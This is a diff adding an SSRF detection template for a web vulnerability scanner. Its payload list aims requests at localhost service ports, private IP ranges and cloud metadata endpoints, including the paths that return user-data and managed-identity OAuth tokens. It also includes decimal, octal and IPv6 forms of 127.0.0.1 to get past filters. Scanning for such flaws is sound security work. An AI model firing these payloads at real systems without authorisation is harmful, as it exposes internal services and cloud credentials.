@@ -1,0 +1,77 @@
+# templates/ssrf/ssrf-internal-network.yaml
+id: ssrf-internal-network
+info:
+  name: SSRF Internal Network Access Detection
+  author: webx-elite
+  severity: high
+  description: Detects SSRF vulnerabilities allowing access to internal networks
+  tags:
+    - ssrf
+    - internal
+    - network
+    - owasp-top10
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-918
+
+vulnerability_type: ssrf
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{ssrf_payload}}"
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Connection refused"
+          - "Connection timeout"
+          - "No route to host"
+          - "Network unreachable"
+          - "HTTP/1."
+          - "Server: "
+        part: body
+        
+      - type: regex
+        regex:
+          - "HTTP/[0-9]\\.[0-9] [0-9]{3}"
+          - "Content-Length: [0-9]+"
+          - "Location: http[s]?://"
+        part: body
+        
+      - type: dsl
+        dsl:
+          - "duration>=3"
+
+payloads:
+  # Internal network ranges
+  - "http://127.0.0.1:22"
+  - "http://127.0.0.1:80"
+  - "http://127.0.0.1:443"
+  - "http://127.0.0.1:8080"
+  - "http://127.0.0.1:3306"
+  - "http://127.0.0.1:5432"
+  - "http://127.0.0.1:6379"
+  
+  # Private IP ranges
+  - "http://192.168.1.1"
+  - "http://10.0.0.1"
+  - "http://172.16.0.1"
+  
+  # Cloud metadata endpoints
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/latest/user-data/"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://169.254.169.254/metadata/identity/oauth2/token"
+  
+  # Alternative formats
+  - "http://localhost/"
+  - "http://0.0.0.0/"
+  - "http://[::1]:80"
+  - "http://2130706433/"  # 127.0.0.1 in decimal
+  - "http://017700000001/"  # 127.0.0.1 in octal
+
+encoders:
+  - url
+  - double_url
